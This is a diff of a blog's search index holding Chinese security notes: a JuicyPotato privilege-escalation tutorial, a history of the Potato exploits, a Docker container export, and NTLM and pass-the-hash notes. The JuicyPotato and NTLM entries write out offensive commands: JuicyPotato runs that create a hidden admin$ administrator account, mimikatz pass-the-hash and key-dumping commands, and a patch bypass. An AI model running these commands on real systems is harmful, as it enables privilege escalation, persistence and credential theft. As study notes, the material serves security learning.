@@ -4,9 +4,123 @@
   
     
     <entry>
+      <title>烂土豆Juicypotato提权原理和利用</title>
+      <link href="/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/"/>
+      <url>/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-Potato（烂土豆）提权的原理："><a href="#0x00-Potato（烂土豆）提权的原理：" class="headerlink" title="0x00 Potato（烂土豆）提权的原理："></a>0x00 Potato（烂土豆）提权的原理：</h2><p>所谓的烂土豆提权就是俗称的MS16-075</p><p>可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p><h3 id="一、简单的原理："><a href="#一、简单的原理：" class="headerlink" title="一、简单的原理："></a>一、简单的原理：</h3><p>攻击者可以诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机！</p><p>Microsoft通过使用已经进行的质询来禁止同协议NTLM身份验证来对此进行修补。这意味着从一个主机回到自身的SMB-&gt; SMB NTLM中继将不再起作用。但是，跨协议攻击（例如HTTP-&gt; SMB）仍然可以正常使用！</p><h3 id="二、我的理解流程："><a href="#二、我的理解流程：" class="headerlink" title="二、我的理解流程："></a>二、我的理解流程：</h3><p>1、所以我们控制HTTP流量大概都流经我们控制的HTTP服务器，做中介人攻击。</p><p>2、可以诱导系统高权用户执行一些操作，例如将它们重定向到需要NTLM身份验证的地方。所有NTLM凭据都将中继到本地SMB侦听器，以创建运行用户定义的命令的新系统服务，例如是Windows Update服务的请求时，就会是一个高权令牌，劫持掉这个令牌</p><p>3、最后模仿这个高权令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌</p><h2 id="0x01-使用方法"><a href="#0x01-使用方法" class="headerlink" title="0x01 使用方法"></a>0x01 使用方法</h2><hr><h3 id="1、查看当前用户权限，是否符合要求"><a href="#1、查看当前用户权限，是否符合要求" class="headerlink" title="1、查看当前用户权限，是否符合要求"></a>1、查看当前用户权限，是否符合要求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all </span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br></pre></td></tr></table></figure><p>如果均开启，可以选择<code>-t *</code></p><p>如果均未开启，那么无法提权</p><p>例子</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzI1NTIucG5n?x-oss-process=image/format,png" alt="image-20200518132552127"></p><h3 id="2、查看RPC默认端口是否为135"><a href="#2、查看RPC默认端口是否为135" class="headerlink" title="2、查看RPC默认端口是否为135"></a>2、查看RPC默认端口是否为135</h3><p>如果被修改(例如为111)，juicypotato的参数可以使用<code>-n 111</code></p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用<code>-k</code></p><p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录</p><p>添加防火墙规则允许135端口入站的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;135&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="3、根据操作系统选择可用的CLSID"><a href="#3、根据操作系统选择可用的CLSID" class="headerlink" title="3、根据操作系统选择可用的CLSID"></a>3、根据操作系统选择可用的CLSID</h3><p>参考列表</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>例如测试系统win7 ，选择CLSID为 {555F3418-D99E-4E51-800A-6E89CFD8B1D7}</p><h3 id="4、选择一个系统未占用的端口作为监听端口"><a href="#4、选择一个系统未占用的端口作为监听端口" class="headerlink" title="4、选择一个系统未占用的端口作为监听端口"></a>4、选择一个系统未占用的端口作为监听端口</h3><p>例如，最终参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure><p>表示开启SeImpersonate权限创建进程，监听端口1111，使用的CLSID为<code>{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ5NDYucG5n?x-oss-process=image/format,png" alt="image-20200518134946085"></p><p>之后会弹出CMD命令行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzU2MTYucG5n?x-oss-process=image/format,png" alt="image-20200518135616269"></p><h2 id="0x02-限制条件"><a href="#0x02-限制条件" class="headerlink" title="0x02 限制条件"></a>0x02 限制条件</h2><hr><p>经过以上的分析，Juicy Potato的限制条件如下：</p><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><h2 id="0x03-WEBSHELL版本"><a href="#0x03-WEBSHELL版本" class="headerlink" title="0x03 WEBSHELL版本"></a>0x03 WEBSHELL版本</h2><p>土司找到了大佬改写过的WebShell版烂土豆，上传到服务器后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p whoami</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ4NDkucG5n?x-oss-process=image/format,png" alt="image-20200518134849944"></p><p>提权成功，但蚁剑的WebShell里好像只能传一个参数？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将password替换为满足强度要求的密码，否则需要改组策略关闭密码强度检查</span><br><span class="line">execute -f JuicyPotato.exe -p net user admin$ password</span><br><span class="line">execute -f JuicyPotato.exe -p net localgroup administrators admin$ &#x2F;add</span><br></pre></td></tr></table></figure><h2 id="0x04-在Cobaltstrike中使用Juicypotato提权"><a href="#0x04-在Cobaltstrike中使用Juicypotato提权" class="headerlink" title="0x04-在Cobaltstrike中使用Juicypotato提权"></a>0x04-在Cobaltstrike中使用Juicypotato提权</h2><p>在Cobaltstrike中使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升</p><p>但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><p>下载并解压reflectiveJuicyPotato.zip，在Cobaltstike中选择脚本管理器–&gt;load加载juicypotato.cna脚本</p><p>随后我们在提权模块即可发现多了一个JuicyPotato</p><h2 id="0x05-烂土豆优点"><a href="#0x05-烂土豆优点" class="headerlink" title="0x05 烂土豆优点"></a>0x05 烂土豆优点</h2><p>​    1.非常可靠，这种都比较稳定，基本上不肯能蓝屏掉线的。<br>​    2.不用需要等Windows更新，可以主动触发高权。<br>​    3.多全版本通杀。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网安全研究 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>土豆提权历史进程</title>
+      <link href="/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/"/>
+      <url>/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h1><p>在研究提权的时候，发现最近这些东西比较多，而且我自己看起来也是比较混乱，就从网上收集了一些资料，做一个整合和搬运，复现和整理一下，方便你我</p><p>现在还是有点迷糊，这个估计会再更新，等我再理的清楚一些，然后后面就是单个的文章发布，这个是总的简介</p><h1 id="0x01-历史进程"><a href="#0x01-历史进程" class="headerlink" title="0x01 历史进程"></a>0x01 历史进程</h1><h2 id="2016-01-16-初代土豆"><a href="#2016-01-16-初代土豆" class="headerlink" title="2016-01-16 初代土豆"></a>2016-01-16 初代土豆</h2><p>劫持wpad配合ntlm中继来进行提权  </p><p><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" target="_blank" rel="noopener">Hot Potato – Windows Privilege Escalation</a> </p><h2 id="2016-09-26-二代土豆"><a href="#2016-09-26-二代土豆" class="headerlink" title="2016-09-26 二代土豆"></a>2016-09-26 二代土豆</h2><p>劫持系统com服务器地址到恶意服务器上,然后在NTLM Type 3时做AcceptSecurityContext调用去拿system的令牌       </p><p><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener">Rotten Potato – Privilege Escalation from Service</a></p><h2 id="2018-01-13-土豆token细节"><a href="#2018-01-13-土豆token细节" class="headerlink" title="2018/01/13  土豆token细节"></a>2018/01/13  土豆token细节</h2><p><a href="https://decoder.cloud/2018/01/13/potato-and-tokens/" target="_blank" rel="noopener">Potatoes and tokens – Decoder’s Blog</a>     </p><h2 id="2018-08-10-整理了一些可用的CLSID"><a href="#2018-08-10-整理了一些可用的CLSID" class="headerlink" title="2018-08-10        整理了一些可用的CLSID"></a>2018-08-10        整理了一些可用的CLSID</h2><p>​    <a href="https://ohpe.it/juicy-potato/" target="_blank" rel="noopener">Juicy Potato (abusing the golden privileges) | jui…</a> </p><h2 id="2018-10-29-微软把土豆利用链修复"><a href="#2018-10-29-微软把土豆利用链修复" class="headerlink" title="2018/10/29 微软把土豆利用链修复"></a>2018/10/29 微软把土豆利用链修复</h2><p>现在ntlm认证时句柄已不可控</p><p><a href="https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/" target="_blank" rel="noopener">No more rotten/juicy potato? – Decoder’s Blog</a> </p><h2 id="2019-03-06-提到了利用命名管道模拟客户端问题"><a href="#2019-03-06-提到了利用命名管道模拟客户端问题" class="headerlink" title="2019/03/06 提到了利用命名管道模拟客户端问题"></a>2019/03/06 提到了利用命名管道模拟客户端问题</h2><p>  <a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener">Windows Named Pipes &amp; Impersonation – Decoder’s Bl</a> </p><h2 id="2020-05-02-三代土豆"><a href="#2020-05-02-三代土豆" class="headerlink" title="2020/05/02 三代土豆"></a>2020/05/02 三代土豆</h2><p>​        目前杀伤力最大的一个利用链，通过命名管道模拟来获取system的令牌<br>​     <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener">PrintSpoofer - Abusing Impersonation Privileges on</a></p><h2 id="2020-05-11"><a href="#2020-05-11" class="headerlink" title="2020/05/11"></a>2020/05/11</h2><p>​       劫持OXID解析器修改ResolveOxid2响应地址为恶意管道地址<br>  <a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" target="_blank" rel="noopener">No more JuicyPotato? Old story, welcome RoguePotat</a><br>​  </p><h2 id="2020-05-13-土豆提权集合"><a href="#2020-05-13-土豆提权集合" class="headerlink" title="2020/05/13 土豆提权集合"></a>2020/05/13 土豆提权集合</h2><p><a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">GitHub - CCob/SweetPotato: Local Service to SYSTEM…</a></p><p>衍生版：</p><p>sweetpotato</p><p>BadPotato</p><p>0x02</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网安全研究 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>docker:打包正在运行的容器，快速拖环境跑路</title>
+      <link href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/"/>
+      <url>/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>遇到了一个docker环境，需求带回来自己调试，所以记录大致流程<br>docker:打包正在运行的容器，快速拖环境跑路</p><h2 id="获取正在运行的容器"><a href="#获取正在运行的容器" class="headerlink" title="获取正在运行的容器"></a>获取正在运行的容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAwMDcucG5n?x-oss-process=image/format,png" alt="image-20200521180007008"></p><p>找到ID 6996fffb6bfa</p><h2 id="将容器打包成镜像"><a href="#将容器打包成镜像" class="headerlink" title="将容器打包成镜像"></a>将容器打包成镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; 容器名称或id 打包的镜像名称:标签</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExNzU5NTEucG5n?x-oss-process=image/format,png" alt="image-20200521175951273"></p><h2 id="拖到本地"><a href="#拖到本地" class="headerlink" title="拖到本地"></a>拖到本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save cnvd -o &#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;source&#x2F;sec.tar</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAzMTgucG5n?x-oss-process=image/format,png" alt="image-20200521180317972"></p><h2 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i hackgod-demo.tar</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 配环境 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>快速导航--文章查询--分类（持续更新）</title>
+      <link href="/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
+      <url>/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>现在突然发现自己写的东西有点乱，需要分类整理一下，出一个导航栏<br>主要csdn这些博客导航做的不会，只能我手动来整理一下来</p><h1 id="0x01-文章类别快速导航"><a href="#0x01-文章类别快速导航" class="headerlink" title="0x01 文章类别快速导航"></a>0x01 文章类别快速导航</h1><ul><li><h2 id="内网安全"><a href="#内网安全" class="headerlink" title="内网安全"></a>内网安全</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9778006.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9778006.html</a></p><ul><li><h2 id="代码审计-和-审计方面的漏洞分析"><a href="#代码审计-和-审计方面的漏洞分析" class="headerlink" title="代码审计 和  审计方面的漏洞分析"></a>代码审计 和  审计方面的漏洞分析</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9295109.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9295109.html</a></p><ul><li><h2 id="二进制安全研究-（多是学习笔记）"><a href="#二进制安全研究-（多是学习笔记）" class="headerlink" title="二进制安全研究  （多是学习笔记）"></a>二进制安全研究  （多是学习笔记）</h2><p><a href="https://blog.csdn.net/god_zzz/category_9975475.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9975475.html</a></p></li><li><h2 id="人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）"><a href="#人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）" class="headerlink" title="人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）"></a>人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9577499.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9577499.html</a></p><ul><li><h2 id="安全开发方向-（主要是关于python的一些东西）"><a href="#安全开发方向-（主要是关于python的一些东西）" class="headerlink" title="安全开发方向 （主要是关于python的一些东西）"></a>安全开发方向 （主要是关于python的一些东西）</h2><p><a href="https://blog.csdn.net/god_zzz/category_9703279.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9703279.html</a></p></li><li><h2 id="配环境杂项（主要是一些坑点，网上难搜的记录下来）"><a href="#配环境杂项（主要是一些坑点，网上难搜的记录下来）" class="headerlink" title="配环境杂项（主要是一些坑点，网上难搜的记录下来）"></a>配环境杂项（主要是一些坑点，网上难搜的记录下来）</h2><p><a href="https://blog.csdn.net/god_zzz/category_8944538.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_8944538.html</a></p></li><li><h2 id="WEB方向漏洞-复现-和分析"><a href="#WEB方向漏洞-复现-和分析" class="headerlink" title="WEB方向漏洞 复现 和分析"></a>WEB方向漏洞 复现 和分析</h2><p><a href="https://blog.csdn.net/god_zzz/category_9013212.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9013212.html</a></p></li><li><h2 id="APP-方向"><a href="#APP-方向" class="headerlink" title="APP 方向"></a>APP 方向</h2><p><a href="https://blog.csdn.net/god_zzz/category_9032877.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9032877.html</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 申请 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网安全:NTML认证流程和PTH原理</title>
+      <link href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/"/>
+      <url>/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><p>@<a href="NTML认证流程和PTH原理.">TOC</a></p><h2 id="0x01-本地认证流程"><a href="#0x01-本地认证流程" class="headerlink" title="0x01 本地认证流程"></a>0x01 本地认证流程</h2><p>操作系统会显示登录界面，接收输入密码后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，和SAM数据库比较认证。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3MzQucG5n?x-oss-process=image/format,png" alt="image-20200514133734007"></p><p>注：</p><ul><li>winlogon.exe（Windows Logon Process），用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机制，它用于本地安全和登陆策略。</li></ul><h2 id="0x02-网络认证"><a href="#0x02-网络认证" class="headerlink" title="0x02 网络认证"></a>0x02 网络认证</h2><p>在内网中，早期SMB协议在网络上传输明文口令。后来出现LM hash，很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="LM-Hash和NTML-Hash"><a href="#LM-Hash和NTML-Hash" class="headerlink" title="LM Hash和NTML Hash"></a>LM Hash和NTML Hash</h3><p>Windows操作系统中的密码由两部分加密组成，即<code>LM Hash</code>和<code>NTML Hash</code>。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>正常的明文密码加密为NTLM Hash的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password ----&gt; 十六进制编码 ----&gt; Unicode转换 ----&gt; MD4加密 ----&gt; 得到NTLM Hash</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line"></span><br><span class="line">61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00</span><br><span class="line"></span><br><span class="line">610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left"></th><th align="left">2000</th><th align="left">xp</th><th align="left">2003</th><th align="left">Vista</th><th align="left">win7</th><th align="left">2008</th><th align="left">2012</th></tr></thead><tbody><tr><td align="left">LM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">NTLM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td></tr></tbody></table><p>自Server 2003之后，Windows的认证方式均为NTML Hash。</p><p>自Server 2008开始默认禁用LM Hash， 当密码超过14位时候会采用NTLM加密</p><p>所以大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>NTLM是Windows的一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p><p>NTLM v1与NTLM v2区别：</p><table><thead><tr><th>都是基于NTLM Hash加密的</th><th>NTLM v1</th><th>NTLM v2</th></tr></thead><tbody><tr><td>加密算法不同</td><td></td><td></td></tr><tr><td>Challage</td><td>8位</td><td>16位</td></tr><tr><td>Net-NTLM Hash</td><td>主要加密算法是DES</td><td>主要加密算法是HMAC-MD5</td></tr></tbody></table><h2 id="0x03-NTLM-认证"><a href="#0x03-NTLM-认证" class="headerlink" title="0x03 NTLM 认证"></a>0x03 NTLM 认证</h2><p><strong>NTLM协议的认证过程分为三步：</strong></p><ul><li>协商（主要用于确认双方协议版本）</li><li>质询（就是挑战（Chalenge）响应（Response）模式）</li><li>验证 （认证完成）</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3NTcucG5n?x-oss-process=image/format,png" alt="image-20200514133757850"></p><p>整个过程中 NTML hash 是没有在网络上传递的</p><h2 id="0x04-Pass-The-Hash-（PTH）原理"><a href="#0x04-Pass-The-Hash-（PTH）原理" class="headerlink" title="0x04 Pass The Hash （PTH）原理"></a>0x04 Pass The Hash （PTH）原理</h2><h3 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h3><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p><h3 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h3><p>抓取管理员的密码、NTLM Hash</p><ul><li>认证的用户名  （质询第一步需要）</li><li>认证用户的NTLM Hash </li></ul><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>哈希传递就是伪造一个客户端，和正常的NTML认证一样</p><p>只是我们用户名对应的NTLM Hash传递到其它主机，给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p>个人感觉其实不算啥漏洞，只是一种技巧手法吧。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>在目标机器中以管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:&lt;用户名&gt; &#x2F;domain:&lt;域名&gt; &#x2F;ntlm:&lt;NTML Hash&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="绕过补丁，进行哈希传递"><a href="#绕过补丁，进行哈希传递" class="headerlink" title="绕过补丁，进行哈希传递"></a>绕过补丁，进行哈希传递</h3><ul><li>当系统安装了<code>KB2871997</code>补丁，将无法使用常规的哈希传递攻击；</li><li>但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。</li></ul><p>抓取AES-256密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br></pre></td></tr></table></figure><p>管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:zeo.com &#x2F;aes256:&lt;AES-256密钥&gt;&quot;</span><br></pre></td></tr></table></figure><p>还有很多工具 MSF CS  impacket Smbexec </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网安全研究 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Kerberos域认证流程---黄金票据和白银票据</title>
       <link href="/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
       <url>/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
+      
